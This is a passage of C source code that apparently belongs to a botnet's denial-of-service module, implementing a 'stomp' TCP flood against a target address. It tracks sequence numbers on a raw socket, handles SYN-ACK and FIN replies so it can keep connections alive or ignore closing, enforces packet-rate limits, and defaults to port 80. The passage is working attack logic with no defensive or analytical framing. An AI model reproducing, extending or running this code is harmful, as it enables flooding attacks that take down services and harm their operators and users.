        pps++;
        totalppsent++;
        ppslast++;
        conn.ppsent_in_session++;
        conn.ppsack++;
        conn.rto_seq = conn.snd_nxt;
        memcpy(conn.rto_buf, payload, current_payleng);
        conn.rto_buf_len = current_payleng;
        conn.rto_pending = 1;
        sys_gettimeofday(&conn.last_send_time, NULL);
        conn.snd_nxt += current_payleng;
        conn.local_seq = conn.snd_nxt;

        if (conn.ppsack >= 1 && conn.established_final)
        {
          int response = pshresp(s, &conn, local_ip, target_addr, finignore, flood);
          if (response == -1)
          {
            conn.established = 0;
            conn.closing = 1;
            break;
          }
          else if (response == 2 || response == 3)
          {
            if (finignore == 0)
            {
              conn.fin_received = 1;
              endhand(s, &conn, local_ip, target_addr, flood);
              conn.established = 0;
              conn.closing = 1;
              break;
            }
            else
            {
              conn.rcv_nxt++;
              conn.remote_seq = conn.rcv_nxt;
            }
          }
          else if (response == 1)
          {
            conn.ppsack = 0;
          }
        }
        if (sleeptime > 0)
          sys_usleep(sleeptime * 1000);
        
        pps_limit_wait(&pps_limit, flood->settings->min_pps, flood->settings->max_pps);

        if (conn.ppsent_in_session % checkival == 0)
        {
          if (!conn.established_final)
          {
            char buffer[65536];
            struct sockaddr_in from;
            socklen_t from_len = sizeof(from);
            int recv_len = sys_recvfrom(s, buffer, sizeof(buffer), MSG_DONTWAIT,
                                    (struct sockaddr *)&from, &from_len);
            if (recv_len > 0)
            {
              struct iphdr *ip = (struct iphdr *)buffer;
              struct tcphdr *tcp = (struct tcphdr *)(buffer + ((ip->version_ihl & 0x0F) * 4));
              if (connmatch(ip, tcp, &conn, local_ip, target_addr) && tcp->syn &&
                  tcp->ack)
              {
                parse_tcp_options(tcp, &conn);
                conn.rcv_nxt = ntohl(tcp->seq) + 1;
                conn.remote_seq = conn.rcv_nxt;
                conn.snd_una = ntohl(tcp->ack_seq);
                conn.established_final = 1;
              }
            }
          }
          finrx(s, &conn, local_ip, target_addr, finignore, flood);
        }
      }

      if (conn.closing || !conn.established)
      {
        continue;
      }
    }
  }

  sys_close(s);
  return NULL;
}

void flood_stompbig(struct flood *flood)
{
  memcpy(pp, enc[RAND_ALPHANUM_STR].string, enc[RAND_ALPHANUM_STR].len);
  struct in_addr in_a;
  in_a.s_addr = flood->targets[0].addr;

  floodPort = flood->settings->dest_port == 0xffff ? 80 : flood->settings->dest_port;
  int finignore = get_option_number(flood->num_of_options, flood->options, OPT_FINIGNORE, 0);
  checkival = get_option_number(flood->num_of_options, flood->options, OPT_CHECK_INTERVAL, 10000);
  rsthreshold = get_option_number(flood->num_of_options, flood->options, OPT_RESTART_THRESHOLD, 200000);

  thread_data_t tdata;
  strcpy(tdata.target_ip, inet_ntoa(in_a));
  tdata.finignore = finignore;
  tdata.flood = flood;

  stomp_flood_thread(&tdata);
}
